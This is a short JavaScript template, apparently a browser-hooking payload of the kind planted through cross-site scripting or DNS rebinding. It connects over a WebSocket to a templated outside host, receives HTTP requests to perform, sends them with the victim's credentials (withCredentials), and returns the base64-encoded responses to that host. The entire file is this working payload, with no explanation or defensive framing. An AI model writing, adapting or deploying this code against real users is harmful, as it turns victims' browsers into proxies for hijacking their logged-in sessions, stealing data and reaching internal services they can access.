// not really the most modern js, but one can never be too sure about the browser's supported feature set
(function () {
    'use strict';

    function httpRequest(ws, seq, method, url, headers, body) {
        if (!method || !url || headers === undefined || body === undefined)
            throw new Error('invalid request parameters');

        const req = new XMLHttpRequest();
        req.open(method, url, true);
        req.withCredentials = true;
        for (const header of headers) {
            req.setRequestHeader(header[0], header[1]);
        }

        req.onload = function () {
            const headersString = req.getAllResponseHeaders();
            const headers = headersString.trim()
                .split('\r\n')
                .map(function (h) { return h.split(': ', 2); });

            sendResponse(ws, seq, {
                status: req.status,
                headers: headers,
                body: btoa(req.responseText)
            });
        };
        req.onerror = function () {
            sendResponseError(ws, seq, 'xhr error, likely a cors issue');
        };

        req.send(body);
    }

    function sendResponse(ws, seq, data) {
        ws.send(JSON.stringify(Object.assign({}, data, {seq: seq})));
    }

    function sendResponseError(ws, seq, err) {
        if (typeof err !== 'string')
            err = err.toString();
        sendResponse(ws, seq, {error: err});
    }

    const ws = new WebSocket('{{SOCK_URL}}');
    ws.onmessage = function (evt) {
        var seq = -1;
        try {
            const obj = JSON.parse(evt.data);
            seq = obj.seq;
            httpRequest(
                ws,
                seq,
                obj.method,
                obj.url,
                obj.headers,
                atob(obj.body)
            );
        } catch (e) {
            sendResponseError(ws, seq, e);
        }
    }
})()
